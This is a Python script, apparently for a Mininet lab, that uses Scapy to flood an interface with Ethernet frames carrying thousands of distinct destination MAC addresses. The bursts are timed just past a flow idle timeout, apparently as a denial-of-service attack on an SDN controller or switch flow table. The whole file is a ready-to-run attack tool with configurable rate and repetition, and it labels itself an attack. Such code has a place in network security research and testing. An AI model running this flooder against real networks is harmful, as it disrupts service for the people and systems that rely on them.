from scapy.all import *
from optparse import OptionParser
import time

class CtrlFlood(object):
    def __init__(self, iface, capacity, interval, times):
        super(CtrlFlood, self).__init__()
        self.iface = iface
        self.capacity = capacity
        self.interval = interval
        self.times = times 
    
    def gen_pkts(self):
        fuzz_pkts = []
        for i in range (128, 128 + self.capacity):
            src_mac = i.to_bytes(6, 'big')
            fuzz_pkt = Ether(
                src = '00:00:DE:AD:BE:EF', # to avoid flooding storm
                dst= '%02x:%02x:%02x:%02x:%02x:%02x' %(
                    src_mac[0], src_mac[1], src_mac[2],
                    src_mac[3], src_mac[4], src_mac[5]
                ), type=1) / (b'fuzz' * 100)
            fuzz_pkts.append(fuzz_pkt)
        return fuzz_pkts

    # each ground of attack is independent, the interval of each ground is slightly longer than idle_timeout.
    def start(self):
        print('starting...')
        for _ in range(self.times):
            fuzz_pkts = self.gen_pkts()
            sendp(fuzz_pkts, iface=self.iface, verbose=False)
            time.sleep(self.interval)

if __name__ == '__main__':
    prompt = '''usage: %prog  -i h1-eth0 -c 1000 -t 1 -n 6000'''
    parser = OptionParser(usage=prompt)
    parser.add_option('-i', '--iface', dest='iface', type="str")
    parser.add_option('-c', '--capacity', dest='capacity', type="int", default=1000)
    parser.add_option('-t', '--interval', dest='interval', type="int", default=1) # 1s
    parser.add_option('-n', '--times', dest='times', type="int", default=6000)
    (options, args) = parser.parse_args()

    try:
        iface = options.iface
        capacity = options.capacity
        interval = options.interval
        times = options.times 
        flooder = CtrlFlood(iface, capacity, interval, times)
        flooder.start()
    except KeyboardInterrupt:
        print('Attack done...')
